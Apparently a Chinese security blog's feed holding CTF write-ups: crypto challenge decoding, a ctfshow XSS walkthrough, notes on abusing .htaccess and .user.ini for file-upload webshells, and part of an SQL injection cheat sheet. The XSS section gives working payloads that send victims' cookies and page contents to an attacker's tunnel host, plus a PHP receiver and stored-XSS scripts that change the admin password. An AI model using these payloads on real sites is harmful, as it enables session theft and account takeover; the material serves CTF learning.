<p>什么鬼？就是一种编码而已<br>通过这个地址我们可以将其解码<br>地址：<a href="https://tool.bugku.com/brainfuck/">Ook编码</a><br>点击Ook！to test即可解密</p>
<h2 id="brainfuck解密"><a href="#brainfuck解密" class="headerlink" title="brainfuck解密"></a>brainfuck解密</h2><blockquote>
<p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;–. .–.- -.-.- –.-.<br>+++++ +..– -..&lt;+ +++++ +[-&gt;+ +++++ +&lt;]&gt;+ +.&lt;++ ++++[ -&gt;— —&lt;] &gt;—-<br>—– .—- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +++++ +++.&lt; +++++ ++[-&gt; —–<br>–&lt;]&gt; .++.- —-. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;+++. –.&lt;+ +++++ [-&gt;– —-&lt;<br>]&gt;— —– —.+ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ +++++ [-&gt;–<br>—-&lt; ]&gt;— —– —.- .++++ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++.&lt; +++++<br>+[-&gt;- —– &lt;]&gt;– —– —.- —– .++++ +++++ .—- —-. &lt;++++ ++[-&gt;<br>+++++ +&lt;]&gt;+ +++++ +++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ ++.&lt;</p>
</blockquote>
<p><a href="https://tool.bugku.com/brainfuck/">brainfuck解密</a><br><img src="https://img-blog.csdnimg.cn/d37a3ee90d6c4dee8b78f144403eac70.png" alt="8"></p>
<h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>得到一个压缩包，暴力破解得到密码为<strong>4132</strong><br>下面没思路了，看了大佬的wp原来是<a href="https://blog.csdn.net/douqingl/article/details/50256931">Serpent </a><br><a href="http://serpent.online-domain-tools.com/">解密网址</a><br><img src="https://img-blog.csdnimg.cn/d78a4f4147ec43349d6241a756c8d818.png" alt="9"></p>
<h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><blockquote>
<p>&#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82</p>
</blockquote>
<p>用**[随波逐流]CTF编码工具<strong>解密得到<br><img src="https://img-blog.csdnimg.cn/d702c6d9ecca46399271a62a0207cb31.png" alt="10"><br>flag为</strong>flag{用你那火热的嘴唇让我在午夜里无尽的销魂}</p>
<h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>一看就是MD5加密<a href="https://www.somd5.com/">解密</a></p>
<h2 id="埃特巴什码"><a href="#埃特巴什码" class="headerlink" title="埃特巴什码"></a>埃特巴什码</h2><blockquote>
<p>密文：uozt{Zgyzhv_xlwv_uiln_xguhsld}</p>
</blockquote>
<blockquote>
<p>埃特巴什码（Atbash Cipher）其实可以视为下面要介绍的简单替换密码的特例，其原理为：它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。在罗马字母表中，它是这样出现的：<br> 明文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br> 密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A</p>
</blockquote>
<p>(埃特巴什码解密)[<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]</a></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-xss</title>
    <url>/2023/02/26/ctfshow-xss/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<p><img src="https://img-blog.csdnimg.cn/bd7d0276dcd141c4ae556dde560fcab9.png" alt="1"></p>
<blockquote>
<p>关键词：</p>
<p> 跨站<br> 脚本（JavaScript、Java、 VBScript、ActiveX、 Flash 或者 HTML）<br> 注入<br> 执行</p>
</blockquote>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="1-什么是-XSS-漏洞"><a href="#1-什么是-XSS-漏洞" class="headerlink" title="1. 什么是 XSS 漏洞?"></a>1. 什么是 XSS 漏洞?</h2><p>XSS 攻击：跨站脚本攻击(Cross Site Scripting)，为不和 前端层叠样式表(Cascading Style Sheets)CSS 混淆，故将跨站脚本攻击缩写为 XSS。</p>
<p>XSS(跨站脚本攻击)是指恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。类似于 sql 注入。是目前最普遍的 Web 应用安全漏洞，也是 Web 攻击中最常见的攻击方式之一。</p>
<p>XSS（ 跨站脚本攻击）攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是 JavaScript，但实际上也可以包括 Java、 VBScript、ActiveX、 Flash 或者甚至是普通的 HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容。</p>
<h2 id="2-XSS-漏洞攻击原理及攻击手段"><a href="#2-XSS-漏洞攻击原理及攻击手段" class="headerlink" title="2. XSS 漏洞攻击原理及攻击手段"></a>2. XSS 漏洞攻击原理及攻击手段</h2><p>HTML 是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是 HTML 标签的开始，之间的字符是页面的标题等等。</p>
<p>当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了 HTML 标签，当这些 HTML 标签引入了一段 JavaScript 脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生 XSS 漏洞。</p>
<blockquote>
<p>常用的 XSS 攻击手段和目的有：</p>
<p>1、盗用 cookie，获取敏感信息。</p>
<p>2、利用植入 Flash，通过 crossdomain 权限设置进一步获取更高权限；或者利用 Java 等得到类似的操作。</p>
<p>3、利用 iframe、frame、XMLHttpRequest 或上述 Flash<br>等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>
<p>4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>
<p>5、在访问量极大的一些页面上的 XSS 可以攻击一些小型网站，实现 DDoS 攻击的效果。</p>
</blockquote>
<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>使用<strong>cpolar</strong>进行内网穿透。<br>本地写入xss.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这一题输入 <code>&lt;script&gt;windows.location.href=&#39;http://1f72xxx3.r3.cpolar.top/xss.php?c=&#39;+document.cookie&lt;/script&gt;</code>不加window也可以。<br>本地得到flag。<br>还有<code>&lt;script&gt;window.open(&#39;http://ip/&#39;+document.cookie)&lt;/script&gt;</code><br><code>&lt;svg onload=&quot;window.open(&#39;http://xxx/&#39;+document.cookie)&quot;&gt;</code><br><code>&lt;iframe onload=&quot;window.open(&#39;http://1xxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p>
<blockquote>
<p>Window open() 方法<br>open() 方法用于打开一个新的浏览器窗口或查找一个已命名的窗口。 </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/74a587fe2e1a4b1091feeeda46152723.png" alt="1"></p>
<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>进行了过滤，<code>&lt;script&gt;</code>进行了过滤。那就使用<code>&lt;body&gt;</code><br><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72eccc63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>本地得到flag。</p>
<h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>过滤img</p>
<h2 id="web320-322"><a href="#web320-322" class="headerlink" title="web320-322"></a>web320-322</h2><p>过滤了<strong>空格</strong>采用&#x2F;**&#x2F;</p>
<h2 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web 323-326"></a>web 323-326</h2><p>过滤了xss，把本地的接收文件（<strong>xss.php</strong>）改为<strong>x.php</strong></p>
<p>以上都是反射型，接下来是<strong>存储型</strong>。</p>
<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72ffec63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>需注意收件人必须是admin。</p>
<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>用户管理处显示我们不是admin<br><img src="https://img-blog.csdnimg.cn/df99dac33016489fab135c338cb89030.png" alt="1"><br>所以我们注册一个用户进行xss，因为在注册用户时会把账户密码存储起来，当管理员打开页面时会进行攻击并且得到cookie。</p>
<p><img src="https://img-blog.csdnimg.cn/e20c9afd03ac4145ae80e7d5fd32c59d.png" alt="2"><br>密码为：<code>&lt;script&gt;document.location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+document.cookie&lt;/script&gt;</code>过一段时间后本地文件会得到cookie<br><img src="https://img-blog.csdnimg.cn/b1fc82f156f840fdb7f7a2c13fe9ece0.png" alt="3"><br>进入用户管理页面没找到flag。用burp抓包试试。<br><img src="https://img-blog.csdnimg.cn/66ded499169947dcb2ea50d53888a948.png" alt="5"></p>
<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>上题的思路不能用了，发现admin的cookie会改变，使用后就不能用了。<br>看了师傅们文章，借鉴一下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.laytable-cell-1-0-1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">index<span class="token punctuation">,</span>value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">'http://1f72ec63.r3.cpolar.top/x.php?c='</span><span class="token operator">+</span>value<span class="token punctuation">.</span>innerText<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span class="token comment">/*该 JavaScript 代码中的主要功能是在当前网页中查找所有类名为“laytable-cell-1-0-1”的
元素。使用 jQuery 库中的 each() 函数迭代这些元素，对每个元素执行以下操作：
使用 indexOf() 函数检查该元素中的文本是否包含“ctfshow&#123;”字符串，如果包含则执行下一步，
否则不做任何操作。

构造一个 URL，其中“http://ip/x.php?cookie=”是目标网站的 URL，而 value.innerText
 是包含“ctfshow&#123;”字符串的元素的文本内容，将该文本作为参数添加到 URL 末尾。

使用 location.href 跳转到新的 URL 页面。


"laytable-cell-1-0-1" 是一个 HTML 元素的类名（class name），用于标识该元素属于一个
表格（table）中的一个单元格（cell）。通常情况下，一个表格中的单元格都具有类似的类名，例
如“laytable-cell-1-0-2”、“laytable-cell-1-1-0”等等，其中的数字表示单元格在表格中的
行列位置。该类名可能是由某个前端框架或库自动生成的，用于对表格进行样式设置或 JavaScript 
操作。在给定的 JavaScript 代码中，该类名被用于查找包含特定字符串的单元格并执行相关操作。
*/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>这是一段 JavaScript 代码，其作用是在当前网页中寻找所有类名为“laytable-cell-1-0-1”的元素，如果这些元素中的文本包含“ctfshow{”，那么将跳转到“<a href="http://ip/x.php?cookie=%E2%80%9D+value.innerText">http://ip/x.php?cookie=”+value.innerText</a> 的页面，其中 value.innerText 是包含“ctfshow{”文本的元素的文本内容。请注意，该代码可能会对用户的计算机或网络造成潜在的安全风险，应仅在安全环境中运行。</p>
</blockquote>
<p>注册一个新用户 密码填入payload<br><code>&lt;script&gt; $(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;     if(value.innerText.indexOf(&#39;ctfshow&#123;&#39;)&gt;-1)     &#123;location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+value.innerText&#125; &#125;); &lt;/script&gt;</code><br>一段时候得到flag。<br><img src="https://img-blog.csdnimg.cn/f5598608d95847fb9ae9c8d93ed5c14e.png" alt="2"></p>
<h3 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h3><p>本题多了一个修改密码的选项，抓包看看。存在一个api接口。<br><img src="https://img-blog.csdnimg.cn/466be17549174dadbe636ff9ea1c7206.png" alt="1"><br>我们可以再创建一个用户，user为payload也就是<code>&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=asdd&#39;&lt;/script&gt;</code><br>这时当我们登陆时就是管理员身份。<br><img src="https://img-blog.csdnimg.cn/7dab5e3fba604f1494dc8156c0c6ebca.png" alt="2"></p>
<h3 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h3><p>抓包发现要使用post请求，不太懂js。网上搜一下使用js发送http请求。<br>推荐一个方法：</p>
<h4 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest()"></a>XMLHttpRequest()</h4><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//第一步：创建需要的对象</span>
httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//第二步：打开连接</span>
httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置请求头 注：post方式必须设置请求头（在建立连接后设置请求头）</span>
httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'name=teswe&amp;ee=ef'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//发送请求 将情头体写在send中</span>
<span class="token comment">/**
 * 获取数据后的处理程序
 */</span>
httpRequest<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//请求后的回调接口，可将请求成功后要执行的程序写在其中</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>httpRequest<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> httpRequest<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//验证请求是否发送成功</span>
        <span class="token keyword">var</span> json <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span>responseText<span class="token punctuation">;</span><span class="token comment">//获取到服务端返回的数据</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注册user 和password的payload，访问用户管理页面即可得到flag。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
<span class="token keyword">var</span> httpRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
httpRequest<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://127.0.0.1/api/change.php'</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
httpRequest<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
httpRequest<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'p=1234567'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/8ab67c81294a4c38ba416d389eb32f4d.png" alt="2"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>.htaccess 和.user.ini</title>
    <url>/2023/02/21/htaccess-%E5%92%8C-user-ini/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>httpd-conf 是 Apache 的系统配置文件，一个全局的配置文件，对整个 web 服务起作用；而.htaccess 也是 Apache 的配置文件，不过相当于一个局部配置文件，只对该文件所在目录下的文件起作用。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>在绕过文件上传的限制中，通常在 Apache 全局配置文件 httpd.conf 中有这样一条配置：</p>
<pre class="line-numbers language-none"><code class="language-none">AddType application&#x2F;x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>







<p>这条配置的意思就是将.php、.phtml 文件后缀的文件当做 php 文件执行，如果开启了这条配置，就可以上传.phtml 文件在执行  php 代码，这也就是为什么在文件上传时可以尝试上传.phtml，不过在高版本中这条配置默认是关闭的，也就是只能解析.php 文件后缀。  </p>
<p>或者这条配置：</p>
<pre class="line-numbers language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>将所有文件都解析为 php 文件。  </p>
<p>通常全局文件我们都是不可更改的，而 Apache 还有一个局部配置文件.htaccess，这个配置文件只对该目录所在的 web 目录起作用，例如：我们在 www 目录下有一个.htaccess 配置文件，配置内容为 <code>AddType application/x-httpd-php .jpg</code> ，将 jpg 文件当做 PHP 文件解析。这样就可以直接解析 jpg 后缀的 webshell。</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .htaccessAddType application&#x2F;x-httpd-php .jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>访问 1.jpg，当做 PHP 解析。  </p>
<h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>.htaccess 配置文件只在 Apache 服务器中起作用。  </p>
<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>php.ini 是 php 的一个全局配置文件，对整个 web 服务起作用；而.user.ini 和.htaccess 一样是目录的配置文件，.user.ini 就是用户自定义的一个 php.ini，通常用这个文件来构造后门和隐藏后门。</p>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>php 配置项中有两个配置可以起到一些作用</p>
<pre class="line-numbers language-none"><code class="language-none">auto_prepend_file &#x3D; &lt;filename&gt;         &#x2F;&#x2F;包含在文件头auto_append_file &#x3D; &lt;filename&gt;          &#x2F;&#x2F;包含在文件尾<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>这两个配置项的作用相当于一个文件包含，比如</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; .user.iniauto_prepend_file &#x3D; 1.jpg&#x2F;&#x2F; 1.jpg&lt;?php phpinfo();?&gt;&#x2F;&#x2F; 11.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<p>也就是在一个目录下有.user.ini 这个配置文件，配置内容为上，有 1.jpg，同时该目录下还需要有.php 后缀的文件，<code>auto_prepend_file = 1.jpg</code> 这个配置的意思就是在当前目录下的.php 文件包含 1.jpg 这个图片，在此处相当于在 11.php 文件头插入了 <code>require(&#39;1.jpg&#39;)</code> 这条语句，也就是说相当于文件包含。<br>另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。</p>
<p>.user.ini 使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。  </p>
<h4 id="局限-1"><a href="#局限-1" class="headerlink" title="局限"></a>局限</h4><p>在.user.ini 中使用这条配置的使用也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。  </p>
<p>但是有时可以使用 <code>../</code> 来将文件上传到其他目录，达到一个利用的效果。  </p>
]]></content>
      <categories>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs题目解析</title>
    <url>/2023/02/20/upload-labs%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      <categories>
        <category>uploadfile</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入速查表</title>
    <url>/2023/01/18/SQL%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h1 id="SQL-注入速查表"><a href="#SQL-注入速查表" class="headerlink" title="SQL 注入速查表"></a>SQL 注入速查表</h1><p>此<a href="https://portswigger.net/web-security/sql-injection">SQL 注入</a>速查表包含有用语法的示例，您可以使用这些示例来执行执行 SQL 注入攻击时经常出现的各种任务。</p>
<h2 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h2><p>您可以将多个字符串连接在一起以形成一个字符串。</p>
<p>| 甲骨文 | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| :—– | ———————————————————— |<br>| 微软   | <code>&#39;foo&#39;+&#39;bar&#39;</code>                                                |<br>| 数据库 | <code>&#39;foo&#39;||&#39;bar&#39;</code>                                               |<br>| MySQL  | <code>&#39;foo&#39; &#39;bar&#39;</code>[注意两个字符串之间的空格] <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code> |</p>
<h2 id="子串"><a href="#子串" class="headerlink" title="子串"></a>子串</h2><p>您可以从具有指定长度的指定偏移量中提取字符串的一部分。请注意，偏移索引是从 1 开始的。以下每个表达式都将返回字符串<code>ba</code>。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th><code>SUBSTR(&#39;foobar&#39;, 4, 2)</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
</tr>
<tr>
<td align="left">数据库</td>
<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SUBSTRING(&#39;foobar&#39;, 4, 2)</code></td>
</tr>
</tbody></table>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>您可以使用注释来截断查询并删除输入后的原始查询部分。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th><code>--comment</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>--comment/*comment*/</code></td>
</tr>
<tr>
<td align="left">数据库</td>
<td><code>--comment/*comment*/</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>#comment</code> <code>-- comment</code>[注意双破折号后的空格] <code>/*comment*/</code></td>
</tr>
</tbody></table>
<h2 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h2><p>您可以查询数据库以确定其类型和版本。在制定更复杂的攻击时，此信息很有用。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th><code>SELECT banner FROM v$versionSELECT version FROM v$instance</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td align="left">数据库</td>
<td><code>SELECT version()</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
</tbody></table>
<h2 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h2><p>您可以列出数据库中存在的表，以及这些表包含的列。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th><code>SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
<tr>
<td align="left">数据库</td>
<td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT * FROM information_schema.tablesSELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
</tr>
</tbody></table>
<h2 id="条件错误"><a href="#条件错误" class="headerlink" title="条件错误"></a>条件错误</h2><p>您可以测试单个布尔条件并在条件为真时触发数据库错误。</p>
<table>
<thead>
<tr>
<th align="left">甲骨文</th>
<th><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">微软</td>
<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
</tr>
<tr>
<td align="left">数据库</td>
